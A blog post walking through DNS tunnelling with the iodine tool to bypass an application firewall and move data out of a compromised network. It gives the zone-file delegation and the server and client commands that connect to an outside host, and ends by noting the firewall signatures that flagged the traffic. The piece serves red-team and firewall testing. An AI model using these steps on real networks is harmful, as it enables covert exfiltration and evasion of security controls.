---
layout: post
title:  "Application Firewall Bypass over DNS (iodine)"
date:   2020-08-03 10:43:25 -0400
categories: exfiltration 
tags: appid
---
<p>
Sometimes the adversary is behind a security stack and needs to bypass that stack for one reason or another. Also once an environment has been compromised and the adversary finds some desirable data, the data needs to be removed from the network. In this use case we will assume that common protocols like FTP and SSH are heavily restricted on egress traffic (as they should be). 
</p>


<p>
Often times DNS to any name server is still permitted. This is typically because of lack of awareness, and fear that without DNS the entire environment feels down to the users. In many networks with captive portals (airports, hotels, etc) DNS is permitted prior to signing in. This means that if you could make the requests actually look like DNS you should be able to bypass other controls.
</p>

<p>
Iodine is a pretty old, yet stable, tool that allows you to tunnel traffic inside DNS requests. I've found that the client and server run very easily on linux, and much less so on Mac and Windows so be prepared for that.
</p>

<p>
You will require a publicly accessible domain under your control and another system on the outside of the security stack.
</p>


<h3>Step 1 - Configure the Domain</h3>

<p>
This needs to be done before you get stuck behind a security stack. So before you get there make sure to have a stable host online that also permits port 53 ingress. You also need to setup a subdomain on a domain you control.
</p>

<p>
We will be leveraging the DNS in this container, <a href="https://github.com/freshdemo/mailanddns" target="_blank">https://github.com/freshdemo/mailanddns</a>.
</p>

<p>
The zone file will need to be edited to add a sub-domain which is delegated to the public IP address of your iodine server. Keep in mind that example.com is not publicly available so you would need to have your laptop pointed to the public IP of this docker container for this to work, which is why you would want a publicly routable domain outside of a proof of concept. The IP address for t1ns is the IP address of a host instantiated in Azure for this testing.
</p>
<br>
<br>
<code>
editing forward.example.com

t1      IN      NS      t1ns.example.com.
t1ns    IN      A       52.156.0.169
</code>

<p>
Don't forget to restart BIND.
</p>
<br>
<br>
<code>
/etc/init.d/bind9 restart
</code>

<p>
You can validate the DNS is setup correctly by ensuring that the delegation resolves correctly.
</p>
<br>
<br>
<code>
dig t1ns.example.com +short
52.156.0.169
</code>

<h3>Step 2 - Start the Server</h3>

<p>
From the server that will run iodine (in this case 52.156.0.169) start the iodine server. The address 172.16.25.1 is used as a point to point interface with your client, so this must be in a different subnet as the client and server.
</p>
<br>
<br>
<code>
iodined -f 172.16.25.1 -P boom t1.example.com
</code>

<p>
If all went well you should see something like this.
</p>

<img src="/images/appid-evasion-iodineserver.png">


<h3>Step 3 - Start the Client</h3>

<p>
From the client system behind the security stack start iodine to connect to the iodine server.
</p>
<br>
<br>
<code>
iodine -f 52.156.0.169 -P boom t1.example.com
</code>

<p>
You should see messages that look like the following, indicating that the tunnel interface has been brought up.
</p>

<img src="/images/appid-evasion-iodineclient.png">

<p>
At this point you should be able to ping the server (172.16.25.1) at the other side of the tunnel.
</p>

<img src="/images/appid-evasion-iodineping.png">

<h3>Step 4 - Use the Tunnel</h3>

<p>
With this current point to point tunnel established over DNS you would now want to proxy your client traffic over the tunnel. This could be accomplished by configuring a web proxy at the server side.
</p>

<p>
For additional security without the requirement to setup more software you could use an SSH tunnel where the address in this case would be 172.16.25.1, <a href="http://127.0.0.1:4000/exfiltration/2020/07/28/appid-evasion-sshtunnel.html" target="_blank">http://127.0.0.1:4000/exfiltration/2020/07/28/appid-evasion-sshtunnel.html</a>
<p>

<h3>Step 5 - View the Results</h3>


<p>
Looking at the following NGFW log we can see that the NGFW permitted the session. That being said there were three opportunities so far that it could have prevented this traffic; The application was identified as tcp-over-dns where all you would want is DNS at most, then there were two spyware signatures identified as "Yourfreedom Command and Control" and "Iodine DNS Tunnel Tool Command and Control".
</p>
<br>
<br>
<img src="/images/appid-evasion-iodinengfw.png" alt="ngfw">



